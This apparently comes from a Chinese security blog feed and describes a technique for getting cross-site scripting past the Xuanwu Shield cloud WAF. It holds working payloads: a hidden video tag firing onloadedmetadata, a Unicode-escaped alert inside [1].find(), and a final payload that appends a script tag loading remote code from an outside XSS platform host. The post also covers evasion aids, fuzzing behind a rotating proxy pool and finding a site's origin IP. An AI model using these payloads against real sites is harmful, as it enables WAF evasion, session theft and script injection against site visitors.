    <published>2019-06-10T09:42:05.000Z</published>
    <updated>2021-01-04T14:53:12.641Z</updated>
    
    <content type="html"><![CDATA[<p><em>本文原发于星盟微信公众号 <a href="https://mp.weixin.qq.com/s/3Qz-ccL2Ynf1YnBlBxjgCQ">https://mp.weixin.qq.com/s/3Qz-ccL2Ynf1YnBlBxjgCQ</a> , 博客转自本人仅做备份用途</em></p><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>最初发现来自实验室的小伙伴,但是仅限于弹窗,后来发现这种类型的payload构造思路来自<a href="http://www.anquan.us/static/drops/papers-894.html">XSS挑战第一期Writeup</a>和<a href="http://www.anquan.us/static/drops/papers-938.html">XSS挑战第二期Writeup</a>以及使用了fuzz的一些小技巧,可以实现任意js代码执行.</p><p>绕云waf简单的方式就是绕过cdn,找真实ip,翻一下历史解析记录基本都能找到,也有一些工具,比如我在<a href="https://m09ic.top/posts/48529/">另一篇文章</a>收集的<a href="https://github.com/Tai7sy/fuckcdn">fuckcdn</a></p><p>有些时候绕不过去cdn,又存在xss漏洞.报告里要是不能验证漏洞就等于没有漏洞,那就只能硬怼玄武盾了.</p><a id="more"></a><h3 id="fuzz起手"><a href="#fuzz起手" class="headerlink" title="fuzz起手"></a>fuzz起手</h3><p>最近一次测试是在今年四月份,最近手里没网站测试了,很多东西只能靠口诉了.</p><p>先上最终payload,payload不唯一,可以有无限多种变形.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6666666&quot;&gt; &lt;video hidden&#x3D;&quot;hidden&quot; onloadedmetadata&#x3D;&quot;[1].find(\u0061lert)&quot; src&#x3D;&quot;http:&#x2F;&#x2F;www.runoob.com&#x2F;try&#x2F;demo_source&#x2F;movie.mp4 &quot; &gt;&lt;&#x2F;video&gt;</span><br></pre></td></tr></table></figure><p>大佬们应该一眼就看出来问题了.</p><p>玄武盾拦截的截图:</p><p><img src="1.png" alt="1"></p><p>如果payload中存在<code>onerror=,onload=</code>这些事件,<code>&lt;img&gt;,&lt;script&gt;</code>这些标签或者<code>alert,javascript</code>这些敏感词,就会弹出玄武盾.</p><p>能fuzz就不手测,如果被ban了ip就上代理池.好像burpsuite不支持代理池,所以简单的fuzz自己写个脚本调用下代理池就好了.</p><p>推荐一个<a href="https://github.com/qiyeboy/IPProxyPool">开源的代理池</a>,有官方提供的dockerfile(我之前使用的时候是有的,刚出去找没找到,不过手动搭建也很快),一键搭建.</p><p>玄武盾对常见关键字过滤的还是挺全的.但是直接fuzz一下就可以发现,比如<code>&lt;video&gt;,&lt;canvas</code>这些html5标签不会触发玄武盾.html5普及都这么多年了,玄武盾还没更新到html5,确实无语.</p><p>html5标签大概有100多个,可以用我收集的<a href="https://github.com/M09Ic/mywordlist/blob/master/html_tags.txt">html5标签字典</a>.</p><p>使用html5进行的xss有不少方法,以html5与xss到google搜索一下就可以找到很多相关的文章,还有一些靶场.</p><p>比如<a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/HTML5_Security_Cheat_Sheet.md">HTML5_Security_Cheat_Sheet</a>与<a href="https://html5sec.org/">html5sec</a>,这里就不多说了.</p><p>比较容易用来构造xss的标签有<code>video</code>.</p><p>随手插入一个<code>&lt;video src=&quot;http://www.runoob.com/try/demo_source/movie.mp4 &quot; &gt;&lt;/video&gt;</code>,成功</p><p>既然html5标签都没过滤,那么html5的事件99%也不会过滤.直接fuzz全部html事件.<a href="https://github.com/M09Ic/mywordlist/blob/master/html_event.txt">html5事件字典在这</a></p><p>很快就找到了比如:<code>onloadedmetadata</code>(好像是余弦大佬提出的)不需要额外的交互,打开网站.当在指定音视频（audio/video）的元数据（如分辨率和时长）加载后触发.</p><p>记得把video标签加上hidden属性.不然动静太大了.</p><p>还有一些其他可用的video的事件,请见<a href="https://www.freebuf.com/articles/web/195507.html">他山之石 | 对 XSS 的一次深入分析认识</a></p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>虽然绕过了关键字检测,但是如果直接用<code>alert()</code>还是会触发玄武盾.</p><p>这里就需要一个2014年乌云大佬们演示过的方法了.</p><p>通过数组实例的<code>find()</code>方法,用于找出第一个符合条件的数组成员.</p><p><code>find()</code>的参数是一个回调函数.验证漏洞用<code>alert</code>即可.</p><p>当然<code>alert</code>关键字已经被过滤,但是这里输入点是在js代码里面,浏览器遇到js代码会调用js解释器,所以将<code>alert</code> js编码为<code>\u0061lert</code>.稍微降低下payload长度,所以只编码一个字符就可以了.</p><p>这里需要详细解释下:</p><p>浏览器首先会用HTML解析器对HTML文档进行词法解析,也就是说如果遇到HTML实体编码,会将其解码,但是注意,解码后并不会当做一个标签,也就是说,类似<code>&amp;#x3c;&amp;#x76;&amp;#x69;&amp;#x64;&amp;#x65;&amp;#x6f;&amp;#x3e;</code>(<code>&lt;video&gt;</code>)这样的标签是不会解释的,但是在数据内部,比如<code>&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;: alert()&quot; &gt;</code>(<code>&lt;a href=&quot;javascript: alert()&quot; &gt;</code>)则能执行js.</p><p>接着浏览器会调用js解析器对js脚本进行解释,如果遇到url编码,会调用url解析器进行解码.</p><p>如果js解析器遇到了js编码,且在字符串中,也就是<code>\u****</code>类型的,则会将其js解码后正常执行js代码需要注意的是比如引号,双引号这些控制字符就算被解码了,也不能生效.也就是说,不能通过js编码逃逸引号.</p><p>所以,最终事件内payload为:</p><p><code>[1].find(\u0061lert)</code></p><h3 id="成功执行"><a href="#成功执行" class="headerlink" title="成功执行"></a>成功执行</h3><p>发送payload:</p><p><img src="2.png" alt="2"></p><p>成功执行,绕过玄武盾.</p><p>当然不能仅仅是弹窗,完整的执行任意js代码的payload类似:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1].find(function()&#123;with(&#96;docom&#39;|e|&#39;nt&#96;);;body.appendChild(createElement(&#39;script&#39;)).src&#x3D;&#39;http:&#x2F;&#x2F;xss.tt&#x2F;XA&#39;&#125;)</span><br></pre></td></tr></table></figure><p>在最开头的两篇文章中偷来的,手动滑稽.</p><p>中间如果有被过滤的关键字,js编码下即可.</p><p>完美绕过玄武盾执行任意js代码.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;em&gt;本文原发于星盟微信公众号 &lt;a href=&quot;https://mp.weixin.qq.com/s/3Qz-ccL2Ynf1YnBlBxjgCQ&quot;&gt;https://mp.weixin.qq.com/s/3Qz-ccL2Ynf1YnBlBxjgCQ&lt;/a&gt; , 博客转自本人仅做备份用途&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;最初发现来自实验室的小伙伴,但是仅限于弹窗,后来发现这种类型的payload构造思路来自&lt;a href=&quot;http://www.anquan.us/static/drops/papers-894.html&quot;&gt;XSS挑战第一期Writeup&lt;/a&gt;和&lt;a href=&quot;http://www.anquan.us/static/drops/papers-938.html&quot;&gt;XSS挑战第二期Writeup&lt;/a&gt;以及使用了fuzz的一些小技巧,可以实现任意js代码执行.&lt;/p&gt;
&lt;p&gt;绕云waf简单的方式就是绕过cdn,找真实ip,翻一下历史解析记录基本都能找到,也有一些工具,比如我在&lt;a href=&quot;https://m09ic.top/posts/48529/&quot;&gt;另一篇文章&lt;/a&gt;收集的&lt;a href=&quot;https://github.com/Tai7sy/fuckcdn&quot;&gt;fuckcdn&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;有些时候绕不过去cdn,又存在xss漏洞.报告里要是不能验证漏洞就等于没有漏洞,那就只能硬怼玄武盾了.&lt;/p&gt;</summary>
    
    
    
    <category term="网络安全" scheme="https://m09ic.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="XSS" scheme="https://m09ic.top/tags/XSS/"/>
    
  </entry>
  
</feed>
